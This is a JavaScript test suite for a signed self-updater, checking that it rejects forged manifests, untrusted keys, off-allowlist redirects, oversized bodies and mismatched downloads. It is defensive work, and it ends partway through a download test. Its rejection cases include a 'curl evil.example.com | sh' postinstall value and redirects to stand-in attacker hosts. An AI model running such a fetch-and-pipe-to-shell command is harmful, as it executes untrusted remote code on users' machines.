// updater.test.js: the signed self-update core. Plain node, no network.
//   node tests/updater.test.js
// Covers updater.js (manifest signatures, the GitHub check, the https rules,
// verified downloads), tools/release-key.js and tools/release-manifest.js.
// GitHub is faked by an injected get() / getStream(). The transport's own
// rules run against servers on 127.0.0.1 (ports 23201-23203), reached through
// a test-only option that no config can set. The certificate check needs the
// openssl command for a throwaway certificate and is skipped without it.
'use strict';
const path = require('path'), fs = require('fs'), os = require('os'), net = require('net'), http = require('http'), tls = require('tls'), crypto = require('crypto');
const assert = require('assert');
const { spawnSync } = require('child_process');
const { Readable } = require('stream');
const U = require('../updater.js');

const ROOT = path.join(__dirname, '..');
const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'ns-upd-'));
const HTTP_PORT = 23201, TLS_PORT = 23202, RAW_PORT = 23203;
const ALLOW = U._test.ALLOW_HTTP_LOOPBACK;
const T = { [ALLOW]: true };
const L = (p) => `http://127.0.0.1:${HTTP_PORT}${p}`;
const REPO = 'Connor-03/NodeSignal';
const API = `https://api.github.com/repos/${REPO}/releases/latest`;
const MANIFEST = 'nodesignal-release.json', SIG = MANIFEST + '.sig';
const AMD = 'nodesignal-linux-amd64.deb';
let failed = 0, passed = 0, skipped = 0;
const t = async (name, fn) => {
  try { await fn(); passed++; console.log('  ok   ' + name); }
  catch (e) { failed++; console.log('  FAIL ' + name + '\n       ' + String(e && e.message || e).split('\n')[0]); }
};
const skip = (name, why) => { skipped++; console.log(`  skip ${name}: ${why}`); };
const sha = (b) => crypto.createHash('sha256').update(b).digest('hex');
const listen = (srv, port) => new Promise((resolve, reject) => { srv.once('error', reject); srv.listen(port, '127.0.0.1', resolve); });
const drain = async (s) => { for await (const _ of s) { /* read it all */ } };
const files = (d) => fs.readdirSync(d).sort();

function newKey(note = 'test key') {
  const { privateKey, publicKey } = crypto.generateKeyPairSync('ed25519');
  const raw = U.rawPublicKey(publicKey), id = U.keyIdOf(raw);
  return { privateKey, raw, id, entry: { id, publicKey: raw.toString('base64'), added: '2026-10-31', note } };
}
const K = newKey(), OTHER = newKey('another key');
const FILES = {
  'NodeSignal-Setup-windows-x64.exe': Buffer.from('MZ pretend windows installer '.repeat(40)),
  'nodesignal-linux-amd64.deb': Buffer.from('!<arch> pretend amd64 package '.repeat(50)),
  'nodesignal-linux-arm64.deb': Buffer.from('!<arch> pretend arm64 package '.repeat(60)),
};
const ASSET = FILES[AMD];
function manifestObj(version, list = FILES) {
  const m = { name: 'NodeSignal', version, tag: 'v' + version, date: '2026-10-31T12:00:00Z', files: {} };
  for (const [n, b] of Object.entries(list)) m.files[n] = { sha256: sha(b), size: b.length };
  return m;
}
const bytesOf = (o) => Buffer.from(JSON.stringify(o, null, 2) + '\n');
const manifestFor = (version) => bytesOf(manifestObj(version));
const signWith = (bytes, key = K, keyId = key.id) =>
  Buffer.from(JSON.stringify({ v: 1, keyId, sig: crypto.sign(null, bytes, key.privateKey).toString('base64') }));

// A fake GitHub behind an injected get(): the releases/latest API answer and
// the release's files. get.log lists every URL asked for.
const dl = (tag, name) => `https://github.com/${REPO}/releases/download/${tag}/${name}`;
function fakeGitHub({ tag = 'v1.4.0', manifest, sig, release = {}, api, extraAssets = [], files: served = {} } = {}) {
  const urls = new Map(), assets = [...extraAssets];
  const add = (name, body) => { assets.push({ name, browser_download_url: dl(tag, name), size: body.length }); urls.set(dl(tag, name), body); };
  for (const [n, b] of Object.entries(FILES)) add(n, b);
  if (manifest) add(MANIFEST, manifest);
  if (sig) add(SIG, sig);
  for (const [u, b] of Object.entries(served)) urls.set(u, b);
  const rel = Object.assign({ tag_name: tag, name: 'NodeSignal ' + tag.slice(1), draft: false, prerelease: false,
    published_at: '2026-10-31T12:00:00Z', body: 'What changed', assets }, release);
  const get = async (url, opts) => {
    get.log.push(url);
    assert(opts && Number.isSafeInteger(opts.maxBytes) && opts.maxBytes > 0, 'get() is always given a byte cap');
    if (url === API) return api ? api() : { status: 200, headers: {}, body: Buffer.from(JSON.stringify(rel)) };
    if (urls.has(url)) {
      assert.strictEqual(opts.maxBytes, U.MAX_META_BYTES, 'manifest and signature are capped at 64 KiB');
      return { status: 200, headers: {}, body: urls.get(url) };
    }
    return { status: 404, headers: {}, body: Buffer.alloc(0) };
  };
  get.log = [];
  return get;
}
const streamOf = (buf, status = 200) => async () => ({ status, headers: {}, stream: Readable.from([buf.subarray(0, 100), buf.subarray(100)]) });

// The local server for the transport tests.
const server = http.createServer((req, res) => {
  const go = (code, loc) => { res.writeHead(code, { Location: loc }); res.end(); };
  switch (req.url) {
    case '/ok': res.writeHead(200, { 'Content-Type': 'application/json' }); return res.end(JSON.stringify({ ua: req.headers['user-agent'], host: req.headers.host }));
    case '/r1': return go(302, '/r2');
    case '/r2': return go(301, L('/ok'));
    case '/to-evil': return go(302, 'https://evil.example.com/payload');
    case '/to-lookalike': return go(302, 'https://objects.githubusercontent.com.evil.example/x');
    case '/to-localhost': return go(307, `http://localhost:${HTTP_PORT}/ok`);
    case '/to-http-github': return go(302, 'http://github.com/x');
    case '/loop': return go(302, '/loop');
    case '/big-length': res.writeHead(200, { 'Content-Length': 2000 }); return res.end(Buffer.alloc(2000, 0x61));
    case '/big-chunked': {
      res.writeHead(200); let i = 0;
      const tick = () => { if (i++ >= 5) return res.end(); res.write(Buffer.alloc(1000, 0x62)); setTimeout(tick, 5); };
      return tick();
    }
    case '/hang': return;                                                   // never answers
    case '/stall': res.writeHead(200, { 'Content-Length': 100 }); return res.write(Buffer.alloc(10));   // then nothing
    case '/asset': return go(302, '/asset-data');
    case '/asset-data': res.writeHead(200, { 'Content-Length': ASSET.length }); return res.end(ASSET);
    default: res.writeHead(404); return res.end();
  }
});

(async () => {
  /* ------------------------------------------------------------ versions */
  await t('compareVersions: numeric parts, leading v ignored, a pre-release below its release', () => {
    const lower = [['1.3.1', '1.4.0'], ['1.9.9', '1.10.0'], ['v1.3.0', '1.3.1'], ['1.4.0-rc.1', '1.4.0'], ['1.4.0~rc1', '1.4.0'],
      ['1.4.0-rc.2', '1.4.0-rc.10'], ['1.4.0-1', '1.4.0-alpha'], ['1.4.0-alpha', '1.4.0-alpha.1'], ['1.3.0', '1.3.0.1'], ['0.9.0', '1.0.0-rc.1']];
    for (const [a, b] of lower) {
      assert.strictEqual(U.compareVersions(a, b), -1, `${a} < ${b}`);
      assert.strictEqual(U.compareVersions(b, a), 1, `${b} > ${a}`);
    }
    for (const [a, b] of [['1.4.0', 'v1.4.0'], ['1.3', '1.3.0'], ['1.4.0+build.7', '1.4.0']]) assert.strictEqual(U.compareVersions(a, b), 0, `${a} = ${b}`);
    for (const bad of ['', 'latest', '1.x', 'v', '1.4.0-', '1.4.0 ', null, 140]) assert.throws(() => U.compareVersions(bad, '1.0.0'), TypeError, String(bad));
  });

  await t('platformAsset names this machine\'s installer, or null', () => {
    assert.strictEqual(U.platformAsset('win32', 'x64'), 'NodeSignal-Setup-windows-x64.exe');
    assert.strictEqual(U.platformAsset('linux', 'x64'), 'nodesignal-linux-amd64.deb');
    assert.strictEqual(U.platformAsset('linux', 'arm64'), 'nodesignal-linux-arm64.deb');
    for (const [p, a] of [['darwin', 'arm64'], ['win32', 'arm64'], ['linux', 'arm'], ['freebsd', 'x64']]) assert.strictEqual(U.platformAsset(p, a), null);
  });

  /* ------------------------------------------------------------ signatures */
  await t('verifyManifest: a good signature from a trusted key verifies', () => {
    const mb = manifestFor('1.4.0');
    const r = U.verifyManifest({ manifestBytes: mb, sigBytes: signWith(mb), trustedKeys: [K.entry] });
    assert.strictEqual(r.ok, true, r.error);
    assert.strictEqual(r.signed, true);
    assert.strictEqual(r.keyId, K.id);
    assert.strictEqual(r.error, null);
    assert.strictEqual(r.manifest.version, '1.4.0');
    assert.deepStrictEqual(r.manifest.files[AMD], { sha256: sha(ASSET), size: ASSET.length });
    // several trusted keys (rotation): the one named by keyId is used
    const r2 = U.verifyManifest({ manifestBytes: mb, sigBytes: signWith(mb, OTHER), trustedKeys: [K.entry, OTHER.entry] });
    assert.strictEqual(r2.ok, true, r2.error);
    assert.strictEqual(r2.keyId, OTHER.id);
    assert.match(K.id, /^[0-9a-f]{16}$/);
    assert.strictEqual(K.id, crypto.createHash('sha256').update(K.raw).digest('hex').slice(0, 16), 'keyId = first 8 bytes of SHA-256(raw key)');
  });

  await t('verifyManifest: any change to the signed bytes is rejected', () => {
    const mb = manifestFor('1.4.0'), sb = signWith(mb), text = mb.toString();
    const variants = {
      'another hash': text.replace(sha(ASSET), sha(Buffer.from('evil'))),
      'another size': text.replace(`"size": ${ASSET.length}`, `"size": ${ASSET.length + 1}`),
      'another version': text.replace('"1.4.0"', '"1.4.1"').replace('"v1.4.0"', '"v1.4.1"'),
      'a trailing space': text + ' ',
      'CRLF line ends': text.replace(/\n/g, '\r\n'),
    };
    for (const [what, v] of Object.entries(variants)) {
      assert.notStrictEqual(v, text, what);
      const r = U.verifyManifest({ manifestBytes: Buffer.from(v), sigBytes: sb, trustedKeys: [K.entry] });
      assert.strictEqual(r.ok, false, what);
      assert.strictEqual(r.manifest, null, what);
      assert.match(r.error, /does not match/, what);
    }
    const s = JSON.parse(sb), raw = Buffer.from(s.sig, 'base64'); raw[10] ^= 1; s.sig = raw.toString('base64');
    const r = U.verifyManifest({ manifestBytes: mb, sigBytes: Buffer.from(JSON.stringify(s)), trustedKeys: [K.entry] });
    assert.strictEqual(r.ok, false, 'one flipped signature bit');
  });

  await t('verifyManifest: a signature by a key the app does not ship is rejected', () => {
    const mb = manifestFor('1.4.0');
    const r = U.verifyManifest({ manifestBytes: mb, sigBytes: signWith(mb, OTHER), trustedKeys: [K.entry] });
    assert.strictEqual(r.ok, false);
    assert.strictEqual(r.signed, true);
    assert.strictEqual(r.keyId, OTHER.id);
    assert.strictEqual(r.manifest, null);
    assert.match(r.error, /does not trust/);
    // the empty release-keys.json this repository ships trusts nothing
    for (const trustedKeys of [[], undefined, null, 'K', [null, 42, 'x']]) {
      assert.strictEqual(U.verifyManifest({ manifestBytes: mb, sigBytes: signWith(mb), trustedKeys }).ok, false, String(trustedKeys));
    }
  });

  await t('verifyManifest: a keyId that is not the signing key\'s is rejected', () => {
    const mb = manifestFor('1.4.0');
    // claims to be K, signed by OTHER (both trusted): checked against K, fails
    const r = U.verifyManifest({ manifestBytes: mb, sigBytes: signWith(mb, OTHER, K.id), trustedKeys: [K.entry, OTHER.entry] });
    assert.strictEqual(r.ok, false);
    assert.match(r.error, /does not match/);
    // a key entry labelled with another key's id trusts nothing: ids are derived, not believed
    const mislabelled = { ...OTHER.entry, id: K.id };
    const r2 = U.verifyManifest({ manifestBytes: mb, sigBytes: signWith(mb, OTHER, K.id), trustedKeys: [mislabelled] });
    assert.strictEqual(r2.ok, false);
    assert.match(r2.error, /does not trust/);
  });

  await t('verifyManifest: no signature file means signed false and never ok', () => {
    for (const sigBytes of [null, undefined]) {
      const r = U.verifyManifest({ manifestBytes: manifestFor('1.4.0'), sigBytes, trustedKeys: [K.entry] });
      assert.strictEqual(r.ok, false);
      assert.strictEqual(r.signed, false);
      assert.strictEqual(r.keyId, null);
      assert.strictEqual(r.manifest, null);
      assert.match(r.error, /no signature/);
    }
  });

  await t('verifyManifest: a correctly signed manifest of the wrong shape is still rejected', () => {
    const mut = (f) => { const o = manifestObj('1.4.0'); f(o); return bytesOf(o); };
    const cases = {
      'short hash': mut((o) => { o.files[AMD].sha256 = o.files[AMD].sha256.slice(2); }),
      'upper-case hash': mut((o) => { o.files[AMD].sha256 = 'AB'.repeat(32); }),
      'hash not hex': mut((o) => { o.files[AMD].sha256 = 'zz'.repeat(32); }),
      'size zero': mut((o) => { o.files[AMD].size = 0; }),
      'negative size': mut((o) => { o.files[AMD].size = -5; }),
      'fractional size': mut((o) => { o.files[AMD].size = 10.5; }),
      'size as text': mut((o) => { o.files[AMD].size = '1200'; }),
      'size of 300 MB': mut((o) => { o.files[AMD].size = 300 * 1024 * 1024; }),
      'unknown file name': mut((o) => { o.files['evil.sh'] = o.files[AMD]; }),
      'path in a file name': mut((o) => { o.files['../' + AMD] = o.files[AMD]; delete o.files[AMD]; }),
      '__proto__ as a file name': Buffer.from(mut(() => {}).toString().replace(`"${AMD}"`, '"__proto__"')),
      'extra field in a file': mut((o) => { o.files[AMD].url = 'https://evil.example.com/x'; }),
      'missing size': mut((o) => { delete o.files[AMD].size; }),
      'extra top-level field': mut((o) => { o.postinstall = 'curl evil.example.com | sh'; }),
      'no files': mut((o) => { o.files = {}; }),
      'files as a list': mut((o) => { o.files = [o.files[AMD]]; }),
      'tag is not v + version': mut((o) => { o.tag = 'v1.4.1'; }),
      'version is not a version': mut((o) => { o.version = 'latest'; o.tag = 'vlatest'; }),
      'another name': mut((o) => { o.name = 'NotNodeSignal'; }),
      'date is not ISO-8601': mut((o) => { o.date = 'yesterday'; }),
      'missing date': mut((o) => { delete o.date; }),
      'not JSON': Buffer.from('{"name": "NodeSignal",'),
      'not UTF-8': Buffer.from([0x7b, 0x22, 0xff, 0x22, 0x3a, 0x31, 0x7d]),
      'a JSON list': Buffer.from('[]'),
      'larger than 64 KiB': Buffer.alloc(U.MAX_META_BYTES + 1, 0x20),
    };
    for (const [what, mb] of Object.entries(cases)) {
      const r = U.verifyManifest({ manifestBytes: mb, sigBytes: signWith(mb), trustedKeys: [K.entry] });
      assert.strictEqual(r.ok, false, what);
      assert.strictEqual(r.manifest, null, what);
      assert.match(r.error, /manifest/, what);
    }
  });

  await t('verifyManifest: malformed signature files are rejected', () => {
    const mb = manifestFor('1.4.0'), s = JSON.parse(signWith(mb));
    // 64 bytes are 86 base64 characters and "==": the last character carries
    // 2 bits, so its 4 low bits must be zero. Setting one decodes to the same
    // bytes in a lenient decoder; the strict one refuses it.
    const B64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    const nonCanonical = s.sig.slice(0, 85) + B64[B64.indexOf(s.sig[85]) | 1] + '==';
    assert(Buffer.from(nonCanonical, 'base64').equals(Buffer.from(s.sig, 'base64')), 'same bytes when decoded leniently');
    const cases = {
      'format version 2': { ...s, v: 2 },
      'no sig': { v: 1, keyId: s.keyId },
      'short keyId': { ...s, keyId: s.keyId.slice(1) },
      'short sig': { ...s, sig: s.sig.slice(4) },
      'a base64url character': { ...s, sig: '-' + s.sig.slice(1) },
      'non-canonical base64': { ...s, sig: nonCanonical },
      'extra field': { ...s, by: 'someone' },
      'a list': [s],
    };
    assert.strictEqual(U.verifyManifest({ manifestBytes: mb, sigBytes: Buffer.from(JSON.stringify(s)), trustedKeys: [K.entry] }).ok, true, 'the unchanged file verifies');
    for (const [what, o] of Object.entries(cases)) {
      const r = U.verifyManifest({ manifestBytes: mb, sigBytes: Buffer.from(JSON.stringify(o)), trustedKeys: [K.entry] });
      assert.strictEqual(r.ok, false, what);
      assert.strictEqual(r.signed, true, what);
    }
    assert.strictEqual(U.verifyManifest({ manifestBytes: mb, sigBytes: Buffer.from('not json'), trustedKeys: [K.entry] }).ok, false);
  });

  /* ------------------------------------------------------------ trusted keys */
  await t('loadTrustedKeys: bad entries are dropped, good ones kept', () => {
    const f = path.join(TMP, 'keys.json');
    fs.writeFileSync(f, JSON.stringify({ keys: [
      K.entry,
      { ...OTHER.entry, id: K.id },                                          // id not derived from its key
      { ...OTHER.entry, publicKey: OTHER.entry.publicKey.slice(0, -4) },     // not 32 bytes
      { ...OTHER.entry, publicKey: 'not base64!' },
      { ...OTHER.entry, added: 'last tuesday' },
      { id: OTHER.id },
      'a string', null, 42, [],
      K.entry,                                                               // a duplicate
      { id: OTHER.id, publicKey: OTHER.entry.publicKey },                    // added and note are optional
    ] }));
    assert.deepStrictEqual(U.loadTrustedKeys(f).map((k) => k.id), [K.id, OTHER.id]);
    assert.deepStrictEqual(U.loadTrustedKeys(f)[0], K.entry);
    assert.deepStrictEqual(U.loadTrustedKeys(path.join(TMP, 'missing.json')), [], 'no file: nothing trusted');
    fs.writeFileSync(f, '[]');
    assert.throws(() => U.loadTrustedKeys(f), /keys/);
    fs.writeFileSync(f, '{ "keys": [');
    assert.throws(() => U.loadTrustedKeys(f), /JSON/);
  });

  await t('the shipped release-keys.json is JSON and every entry in it is usable', () => {
    const j = JSON.parse(fs.readFileSync(path.join(ROOT, 'release-keys.json'), 'utf8'));
    assert(Array.isArray(j.keys), '{ "keys": [...] }');
    assert.strictEqual(U.DEFAULT_KEYS_FILE, path.join(ROOT, 'release-keys.json'));
    assert.strictEqual(U.loadTrustedKeys().length, j.keys.length, 'an entry in release-keys.json is malformed and would be ignored');
  });

  /* ------------------------------------------------------------ checkLatest */
  await t('checkLatest: a newer signed release is available and verified', async () => {
    const mb = manifestFor('1.4.0'), gh = fakeGitHub({ manifest: mb, sig: signWith(mb) });
    const r = await U.checkLatest({ currentVersion: '1.3.1', trustedKeys: [K.entry], get: gh });
    assert.strictEqual(r.error, null);
    assert.strictEqual(r.available, true);
    assert.strictEqual(r.signed, true);
    assert.strictEqual(r.verified, true);
    assert.strictEqual(r.version, '1.4.0');
    assert.strictEqual(r.tag, 'v1.4.0');
    assert.strictEqual(r.notes, 'What changed');
    assert.strictEqual(r.published, '2026-10-31T12:00:00Z');
    assert.strictEqual(r.page, 'https://github.com/Connor-03/NodeSignal/releases/tag/v1.4.0');
    assert.deepStrictEqual(r.manifest.files[AMD], { sha256: sha(ASSET), size: ASSET.length });
    assert.strictEqual(r.assets[AMD], dl('v1.4.0', AMD));
    assert.deepStrictEqual(Object.keys(r.assets).sort(), [...Object.keys(FILES), MANIFEST, SIG].sort());
    assert.deepStrictEqual(gh.log, [API, dl('v1.4.0', MANIFEST), dl('v1.4.0', SIG)]);
  });

  await t('checkLatest: no .sig gives signed false, available true, verified false', async () => {
    const gh = fakeGitHub({ manifest: manifestFor('1.4.0') });
    const r = await U.checkLatest({ currentVersion: '1.3.1', trustedKeys: [K.entry], get: gh });
    assert.strictEqual(r.available, true);
    assert.strictEqual(r.signed, false);
    assert.strictEqual(r.verified, false);
    assert.strictEqual(r.manifest, null, 'nothing to install from');
    assert.match(r.error, /no signature/);
    assert.match(r.error, /by hand/);
    assert.strictEqual(r.version, '1.4.0');
    // no manifest at all (a release from before signing): announced, not installable
    const r2 = await U.checkLatest({ currentVersion: '1.3.1', trustedKeys: [K.entry], get: fakeGitHub() });
    assert.strictEqual(r2.available, true);
    assert.strictEqual(r2.verified, false);
    assert.match(r2.error, /no nodesignal-release\.json/);
  });

  await t('checkLatest: a signed manifest for another version than the tag is not verified', async () => {
    const mb = manifestFor('1.4.0');
    const r = await U.checkLatest({ currentVersion: '1.3.1', trustedKeys: [K.entry], get: fakeGitHub({ tag: 'v1.5.0', manifest: mb, sig: signWith(mb) }) });
    assert.strictEqual(r.available, true);
    assert.strictEqual(r.signed, true);
    assert.strictEqual(r.verified, false);
    assert.strictEqual(r.manifest, null);
    assert.match(r.error, /for version 1\.4\.0, not 1\.5\.0/);
  });

  await t('checkLatest: a tampered manifest or an unknown key on GitHub is not verified', async () => {
    const mb = manifestFor('1.4.0'), sb = signWith(mb);
    const tampered = Buffer.from(mb.toString().replace(sha(ASSET), sha(Buffer.from('evil'))));
    for (const [what, opts, re] of [
      ['tampered', { manifest: tampered, sig: sb }, /does not match/],
      ['unknown key', { manifest: mb, sig: signWith(mb, OTHER) }, /does not trust/],
    ]) {
      const r = await U.checkLatest({ currentVersion: '1.3.1', trustedKeys: [K.entry], get: fakeGitHub(opts) });
      assert.strictEqual(r.available, true, what);
      assert.strictEqual(r.signed, true, what);
      assert.strictEqual(r.verified, false, what);
      assert.strictEqual(r.manifest, null, what);
      assert.match(r.error, re, what);
    }
  });

  await t('checkLatest: an older or equal version is not available, and nothing more is fetched', async () => {
    const mb = manifestFor('1.4.0');
    for (const cur of ['1.4.0', 'v1.4.0', '1.4.0+local', '1.4.1', '2.0.0']) {
      const gh = fakeGitHub({ manifest: mb, sig: signWith(mb) });
      const r = await U.checkLatest({ currentVersion: cur, trustedKeys: [K.entry], get: gh });
      assert.strictEqual(r.available, false, cur);
      assert.strictEqual(r.verified, false, cur);
      assert.strictEqual(r.error, null, cur);
      assert.strictEqual(r.version, '1.4.0', cur);
      assert.deepStrictEqual(gh.log, [API], cur);
    }
    const r = await U.checkLatest({ currentVersion: '1.4.0-rc.1', trustedKeys: [K.entry], get: fakeGitHub({ manifest: mb, sig: signWith(mb) }) });
    assert.strictEqual(r.available, true, 'the release is newer than its own release candidate');
    assert.strictEqual(r.verified, true);
  });

  await t('checkLatest: drafts and pre-releases are skipped', async () => {
    const mb = manifestFor('1.5.0-rc.1');
    for (const [what, opts] of [
      ['flagged pre-release', { release: { prerelease: true } }],
      ['draft', { release: { draft: true } }],
      ['pre-release version, not flagged', { tag: 'v1.5.0-rc.1', manifest: mb, sig: signWith(mb) }],
    ]) {
      const gh = fakeGitHub(opts);
      const r = await U.checkLatest({ currentVersion: '1.3.1', trustedKeys: [K.entry], get: gh });
      assert.strictEqual(r.available, false, what);
      assert.strictEqual(r.version, null, what);
      assert.strictEqual(r.error, null, what);
      assert.deepStrictEqual(gh.log, [API], what);
    }
  });

  await t('checkLatest: release notes are cleaned and capped at 8 KiB; odd asset URLs are dropped', async () => {
    const mb = manifestFor('1.4.0');
    const body = 'line one\r\nline two\x07\x1b[31m\u202eevil\u0000\ttab\n' + '\u00e9'.repeat(5000);
    const gh = fakeGitHub({ manifest: mb, sig: signWith(mb), release: { body }, extraAssets: [
      { name: AMD, browser_download_url: 'https://evil.example.com/' + AMD },      // listed first, wrong host
      { name: MANIFEST, browser_download_url: 'http://github.com/x/' + MANIFEST },  // not https
      { name: 'evil.sh', browser_download_url: dl('v1.4.0', 'evil.sh') },           // not a release file
    ] });
    const r = await U.checkLatest({ currentVersion: '1.3.1', trustedKeys: [K.entry], get: gh });
    assert.strictEqual(r.verified, true, r.error);
    assert(r.notes.startsWith('line one\nline two[31mevil\ttab\n'), JSON.stringify(r.notes.slice(0, 40)));
    assert(!/[\x00-\x08\x0b-\x1f\x7f\u202e\ufffd]/.test(r.notes), 'no control characters, no broken character at the cut');
    assert(Buffer.byteLength(r.notes) <= 8192 && Buffer.byteLength(r.notes) > 8000, String(Buffer.byteLength(r.notes)));
    assert.strictEqual(r.assets[AMD], dl('v1.4.0', AMD));
    assert.strictEqual(r.assets[MANIFEST], dl('v1.4.0', MANIFEST));
    assert(!('evil.sh' in r.assets));
  });

  await t('checkLatest: GitHub trouble is reported in error, never thrown', async () => {
    const answer = (status, body = '') => fakeGitHub({ api: () => ({ status, headers: {}, body: Buffer.from(body) }) });
    for (const [what, get, re] of [
      ['404', answer(404), /no published release/],
      ['403', answer(403), /rate limited/],
      ['500', answer(500), /HTTP 500/],
      ['not JSON', answer(200, '<html>'), /could not check GitHub/],
      ['a list', answer(200, '[]'), /unexpected answer/],
      ['tag not a version', answer(200, '{"tag_name":"latest"}'), /not a version/],
      ['network down', async () => { throw new Error('getaddrinfo ENOTFOUND api.github.com'); }, /could not check GitHub.*ENOTFOUND/],
    ]) {
      const r = await U.checkLatest({ currentVersion: '1.3.1', trustedKeys: [K.entry], get });
      assert.strictEqual(r.available, false, what);
      assert.strictEqual(r.verified, false, what);
      assert.match(r.error, re, what);
    }
    // the manifest cannot be fetched, or is larger than the cap even though get() was asked to cap it
    const mb = manifestFor('1.4.0');
    const huge = fakeGitHub({ manifest: mb, sig: signWith(mb), files: { [dl('v1.4.0', MANIFEST)]: Buffer.alloc(U.MAX_META_BYTES + 1, 0x20) } });
    const gone = fakeGitHub({ manifest: mb, sig: signWith(mb), files: {} });
    gone.log = []; const goneGet = async (u, o) => (u.endsWith(MANIFEST) ? { status: 404, headers: {}, body: Buffer.alloc(0) } : gone(u, o));
    for (const [what, get, re] of [['larger than 64 KiB', huge, /larger than/], ['404', goneGet, /could not download.*HTTP 404/]]) {
      const r = await U.checkLatest({ currentVersion: '1.3.1', trustedKeys: [K.entry], get });
      assert.strictEqual(r.available, true, what);
      assert.strictEqual(r.verified, false, what);
      assert.match(r.error, re, what);
    }
    await assert.rejects(U.checkLatest({ currentVersion: 'whatever', get: answer(404) }), TypeError);
    await assert.rejects(U.checkLatest({ currentVersion: '1.3.1', repo: 'a/b/../c', get: answer(404) }), TypeError);
  });

  /* ------------------------------------------------------------ https rules */
  await t('httpsGet: only https to GitHub\'s hosts, refused before any connection', async () => {
    const calls = [];
    const connect = async (h, p) => { calls.push([h, p]); throw new Error('must not connect'); };
    const refused = {
      'http://api.github.com/repos/x': /only https/,
      'ftp://github.com/x': /only https/,
      'https://example.com/': /host not allowed: example\.com/,
      'https://api.github.com.evil.example/': /host not allowed/,
      'https://evilgithub.com/': /host not allowed/,
      'https://127.0.0.1/': /host not allowed/,
      'https://user:pw@github.com/': /credentials/,
      'https://github.com:8443/': /port not allowed/,
      [L('/ok')]: /only https/,                                  // without the test-only option
      'not a url': /not a valid URL/,
    };
    for (const [u, re] of Object.entries(refused)) await assert.rejects(U.httpsGet(u, { connect }), re, u);
    assert.deepStrictEqual(calls, []);
    // the test-only switch cannot come from a config file: JSON has no symbols
    const fromConfig = JSON.parse('{"allowHttpLoopback": true, "ALLOW_HTTP_LOOPBACK": true, "test": true, "insecure": true}');
    await assert.rejects(U.httpsGet(L('/ok'), { ...fromConfig, connect }), /only https/);
    // and even with it, plain http goes to exactly 127.0.0.1 and nowhere else
    await assert.rejects(U.httpsGet(`http://localhost:${HTTP_PORT}/ok`, { ...T, connect }), /only https/);
    assert.deepStrictEqual(calls, []);
    assert.deepStrictEqual([...U.ALLOWED_HOSTS].sort(), ['api.github.com', 'github.com', 'objects.githubusercontent.com', 'release-assets.githubusercontent.com']);
    for (const h of U.ALLOWED_HOSTS) assert.strictEqual(U.checkUrl(`https://${h}/x`).hostname, h);
  });

  await listen(server, HTTP_PORT);
  try {
    await t('httpsGet: follows redirects and sends the NodeSignal-updater User-Agent', async () => {
      const r = await U.httpsGet(L('/r1'), { ...T, maxBytes: 4096 });
      assert.strictEqual(r.status, 200);
      assert.deepStrictEqual(JSON.parse(r.body), { ua: 'NodeSignal-updater', host: `127.0.0.1:${HTTP_PORT}` });
      assert.strictEqual((await U.httpsGet(L('/nope'), T)).status, 404, 'other statuses are returned, not thrown');
    });

    await t('httpsGet: a redirect to a host off the allowlist is refused', async () => {
      for (const [p, re] of [['/to-evil', /host not allowed: evil\.example\.com/], ['/to-lookalike', /host not allowed/],
        ['/to-localhost', /only https/], ['/to-http-github', /only https/]]) {
        await assert.rejects(U.httpsGet(L(p), T), re, p);
        await assert.rejects(U.httpsGetStream(L(p), T), re, p);
      }
      await assert.rejects(U.httpsGet(L('/loop'), { ...T, redirects: 3 }), /too many redirects/);
      await assert.rejects(U.httpsGet(L('/r1'), { ...T, redirects: 1 }), /too many redirects/);
    });

    await t('httpsGet: the body is capped', async () => {
      await assert.rejects(U.httpsGet(L('/big-length'), { ...T, maxBytes: 1000 }), /larger than 1000 bytes/);
      await assert.rejects(U.httpsGet(L('/big-chunked'), { ...T, maxBytes: 2500 }), /larger than 2500 bytes/);
      assert.strictEqual((await U.httpsGet(L('/big-length'), { ...T, maxBytes: 2000 })).body.length, 2000, 'exactly the cap is fine');
      await assert.rejects(U.httpsGetStream(L('/big-length'), { ...T, maxBytes: 1000 }), /larger than 1000 bytes/);
      const s = await U.httpsGetStream(L('/big-chunked'), { ...T, maxBytes: 2500 });
      await assert.rejects(drain(s.stream), /larger than 2500 bytes/);
    });

    await t('httpsGet: a silent server times out', async () => {
      await assert.rejects(U.httpsGet(L('/hang'), { ...T, timeoutMs: 300 }), /300 ms/);
      const s = await U.httpsGetStream(L('/stall'), { ...T, timeoutMs: 300 });
      await assert.rejects(drain(s.stream), /stalled/);
    });

    /* ---------------------------------------------------------- downloads */
    await t('downloadVerified: the right bytes land at dest, nothing else is left', async () => {
      const d = fs.mkdtempSync(path.join(TMP, 'dl-')), dest = path.join(d, AMD);
      fs.writeFileSync(dest + '.part', 'left over from an interrupted run');
      assert.strictEqual(await U.downloadVerified({ url: dl('v1.4.0', AMD), sha256: sha(ASSET), size: ASSET.length, dest, getStream: streamOf(ASSET) }), dest);
      assert(fs.readFileSync(dest).equals(ASSET));
      assert.deepStrictEqual(files(d), [AMD]);
      // buffered, through get()
      fs.rmSync(dest);
      await U.downloadVerified({ url: dl('v1.4.0', AMD), sha256: sha(ASSET), size: ASSET.length, dest,
        get: async (u, o) => { assert.strictEqual(o.maxBytes, ASSET.length); return { status: 200, headers: {}, body: ASSET }; } });
      assert(fs.readFileSync(dest).equals(ASSET));
      // the stream transport, following a redirect
      fs.rmSync(dest);
      await U.downloadVerified({ url: L('/asset'), sha256: sha(ASSET), size: ASSET.length, dest, getStream: (u, o) => U.httpsGetStream(u, { ...o, ...T }) });
      assert(fs.readFileSync(dest).equals(ASSET));
      assert.deepStrictEqual(files(d), [AMD]);
    });

    await t('downloadVerified: a wrong hash or a wrong size leaves no file', async () => {
      const d = fs.mkdtempSync(path.join(TMP, 'dl-')), dest = path.join(d, AMD), url = dl('v1.4.0', AMD);
      const bad = Buffer.from(ASSET); bad[5] ^= 1;
      const cases = [
        ['same size, other bytes', streamOf(bad), /SHA-256/],
        ['one byte too many', streamOf(Buffer.concat([ASSET, Buffer.from('x')])), /larger than the signed size/],
        ['one byte short', streamOf(ASSET.subarray(0, ASSET.length - 1)), /bytes, the signed manifest says/],
        ['HTTP 404', streamOf(ASSET, 404), /HTTP 404/],
        ['cut off', async () => ({ status: 200, stream: Readable.from((async function* () { yield ASSET.subarray(0, 50); throw new Error('connection reset'); })()) }), /connection reset/],
        ['off-list redirect', (u, o) => U.httpsGetStream(L('/to-evil'), { ...o, ...T }), /host not allowed/],
